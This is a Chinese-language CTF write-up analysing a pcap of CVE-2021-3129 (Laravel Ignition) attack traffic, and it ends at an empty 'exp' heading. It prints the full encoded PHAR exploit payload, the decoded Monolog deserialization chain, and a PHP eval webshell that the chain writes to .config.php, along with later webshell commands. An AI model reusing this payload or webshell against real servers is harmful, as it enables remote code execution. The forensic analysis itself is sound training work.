::: info
2021-绿城杯-流量分析
:::

## 1、思路

附件为 pcap 包

Wireshark 分析，过滤条件 `http.user_agent contains "python"`，发现多个 User-Agent 为 python 的记录

6644	56.990668	192.168.132.130	192.168.132.138	HTTP/JSON	142	POST /index.php/_ignition/execute-solution/ HTTP/1.1 , JSON (application/json)

```
JavaScript Object Notation: application/json
    Object
        Member: solution
            [Path with value: /solution:Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution]
            [Member with value: solution:Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution]
            String value: Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution
            Key: solution
            [Path: /solution]
        Member: parameters
            Object
                Member: viewFile
                    [Path with value [truncated]: /parameters/viewFile:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B]
                    [Member with value [truncated]: viewFile:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=0]
                    String value [truncated]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K
                    Key: viewFile
                    [Path: /parameters/viewFile]
                Member: variableName
                    [Path with value: /parameters/variableName:doesnotexist]
                    [Member with value: variableName:doesnotexist]
                    String value: doesnotexist
                    Key: variableName
                    [Path: /parameters/variableName]
            Key: parameters
            [Path: /parameters]
```

发现奇怪的字符 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00o=00J=00A=00g=00A=00A=00A=00g=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00C=00y=00A=00Q=00A=00A=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00c=007=00T=00z=00o=00z=00M=00j=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00F=00N=005=00c=002=00x=00v=00Z=001=00V=00k=00c=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00E=006=00e=003=00M=006=00O=00T=00o=00i=00A=00C=00o=00A=00c=002=009=00j=00a=002=00V=000=00I=00j=00t=00P=00O=00j=00I=005=00O=00i=00J=00N=00b=002=005=00v=00b=00G=009=00n=00X=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00J=00c=00Q=00n=00V=00m=00Z=00m=00V=00y=00S=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=006=00N=00z=00p=007=00c=00z=00o=00x=00M=00D=00o=00i=00A=00C=00o=00A=00a=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=007=00c=00j=00o=00z=00O=003=00M=006=00M=00T=00M=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00l=00N=00p=00e=00m=00U=00i=00O=002=00k=006=00L=00T=00E=007=00c=00z=00o=005=00O=00i=00I=00A=00K=00g=00B=00i=00d=00W=00Z=00m=00Z=00X=00I=00i=00O=002=00E=006=00M=00T=00p=007=00a=00T=00o=00w=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=003=00M=006=00N=00z=00c=006=00I=00m=00V=00j=00a=00G=008=00g=00X=00j=00w=00/=00c=00G=00h=00w=00I=00E=00B=00l=00d=00m=00F=00s=00K=00E=00B=00n=00e=00m=00l=00u=00Z=00m=00x=00h=00d=00G=00U=00o=00Y=00m=00F=00z=00Z=00T=00Y=000=00X=002=00R=00l=00Y=002=009=00k=00Z=00S=00g=00k=00X=001=00B=00P=00U=001=00R=00b=00M=00T=00Q=000=00M=00z=00N=00d=00K=00S=00k=00p=00O=00z=009=00e=00P=00i=00A=00+=00I=00C=005=00j=00b=002=005=00m=00a=00W=00c=00u=00c=00G=00h=00w=00I=00j=00t=00z=00O=00j=00U=006=00I=00m=00x=00l=00d=00m=00V=00s=00I=00j=00t=00O=00O=003=001=009=00c=00z=00o=004=00O=00i=00I=00A=00K=00g=00B=00s=00Z=00X=00Z=00l=00b=00C=00I=007=00T=00j=00t=00z=00O=00j=00E=000=00O=00i=00I=00A=00K=00g=00B=00p=00b=00m=00l=000=00a=00W=00F=00s=00a=00X=00p=00l=00Z=00C=00I=007=00Y=00j=00o=00x=00O=003=00M=006=00M=00T=00Q=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00k=00x=00p=00b=00W=00l=000=00I=00j=00t=00p=00O=00i=000=00x=00O=003=00M=006=00M=00T=00M=006=00I=00g=00A=00q=00A=00H=00B=00y=00b=002=00N=00l=00c=003=00N=00v=00c=00n=00M=00i=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=003=00M=006=00N=00z=00o=00i=00Y=003=00V=00y=00c=00m=00V=00u=00d=00C=00I=007=00a=00T=00o=00x=00O=003=00M=006=00N=00j=00o=00i=00c=003=00l=00z=00d=00G=00V=00t=00I=00j=00t=009=00f=00X=001=00p=00O=00j=00c=007=00a=00T=00o=003=00O=003=000=00F=00A=00A=00A=00A=00Z=00H=00V=00t=00b=00X=00k=00E=00A=00A=00A=00A=00X=00E=00t=00L=00Y=00Q=00Q=00A=00A=00A=00A=00M=00f=00n=00/=00Y=00t=00g=00E=00A=00A=00A=00A=00A=00A=00A=00A=00I=00A=00A=00A=00A=00d=00G=00V=00z=00d=00C=005=000=00e=00H=00Q=00E=00A=00A=00A=00A=00X=00E=00t=00L=00Y=00Q=00Q=00A=00A=00A=00A=00M=00f=00n=00/=00Y=00t=00g=00E=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00d=00G=00V=00z=00d=00D=00Z=006=00P=00U=00p=00j=00h=00k=00a=00y=00y=00N=00i=00Q=003=00Y=00w=00m=00f=00p=00c=008=00Q=00J=00n=00s=00A=00g=00A=00A=00A=00E=00d=00C=00T=00U=00I=00=00

这是 CVE-2021-3129 漏洞攻击特征，是一个远程 RCE 的一个漏洞

## 2、还原流量

这个流量是经过加密处理的，需要进行还原

### 去掉 AAA* ，把 =00 换为空

PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQoJAgAAAgAAABEAAAABAAAAAACyAQAAYToyOntpOjc7TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjozO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Nzc6ImVjaG8gXjw/cGhwIEBldmFsKEBnemluZmxhdGUoYmFzZTY0X2RlY29kZSgkX1BPU1RbMTQ0MzNdKSkpOz9ePiA+IC5jb25maWcucGhwIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX1pOjc7aTo3O30FAAAAZHVtbXkEAAAAXEtLYQQAAAAMfn/YtgEAAAAAAAAIAAAAdGVzdC50eHQEAAAAXEtLYQQAAAAMfn/YtgEAAAAAAAB0ZXN0dGVzdDZ6PUpjhkayyNiQ3Ywmfpc8QJnsAgAAAEdCTUI

### base64 解码

```
<?php __HALT_COMPILER(); ?>
	�a:2:{i:7;O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";r:3;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:77:"echo ^<?php @eval(@gzinflate(base64_decode($_POST[14433])));?^> > .config.php";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}i:7;i:7;}dummy\KKa~ضtest.txt\KKa~ضtesttest6z=Jc�F��ؐ݌&~�<@��GBMB
```

发现一句话木马：`<?php @eval(@gzinflate(base64_decode($_POST[14433])));?^>`

- base64_decode 从 POST 请求参数中获取一个名为 14433 的值，该值经过 base64 编码
- gzinflate 对经过解码的数据进行压缩，得到原始的恶意代码
- eval 执行压缩后的恶意代码
- 使用 @ 符号来抑制可能的错误消息

### 14433

查看压缩包，过滤条件 `http.request.method == "POST"`

20505	242.795917	192.168.132.130	192.168.132.138	HTTP	91	POST /.config.php HTTP/1.1  (application/x-www-form-urlencoded)

```
HTML Form URL Encoded: application/x-www-form-urlencoded
    Form item: "14433" = "c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD/APDomON6gwMUszMjM3MkxOTLYwjdXU1LQGAA=="
        Key: 14433
        Value: c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD/APDomON6gwMUszMjM3MkxOTLYwjdXU1LQGAA==
     [truncated]Form item: "_0x46f26721cac85" = "dVNdT9swFH3efkWw/JCINC1QyoeXydNINaS2VKGbNAGK0viWWjQfip0BK/3vu3YKlIf1JfW9536c42MuC5ko0C4RUlWr9DmBui5rRXyH9IjHOOYSLXNIVjKX2u15jJaVkHXITeW9qSwrKJJ5qgDDWCIXbgvxnDUts0cR4v8izcGlyXUU/4riG3L9Pb6czpLh5S
        Key: _0x46f26721cac85
        Value [truncated]: dVNdT9swFH3efkWw/JCINC1QyoeXydNINaS2VKGbNAGK0viWWjQfip0BK/3vu3YKlIf1JfW9536c42MuC5ko0C4RUlWr9DmBui5rRXyH9IjHOOYSLXNIVjKX2u15jJaVkHXITeW9qSwrKJJ5qgDDWCIXbgvxnDUts0cR4v8izcGlyXUU/4riG3L9Pb6czpLh5SiafBtH5M62Tes6rGq4T3ATnEW6
    Form item: "ne6c06434f524b" = "O5RDovcGhwc3R1ZHlfcHJvL1dXVy9zZWNyZXQv"
        Key: ne6c06434f524b
        Value: O5RDovcGhwc3R1ZHlfcHJvL1dXVy9zZWNyZXQv
```

14433 的 值为 c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD/APDomON6gwMUszMjM3MkxOTLYwjdXU1LQGAA==

## 3、exp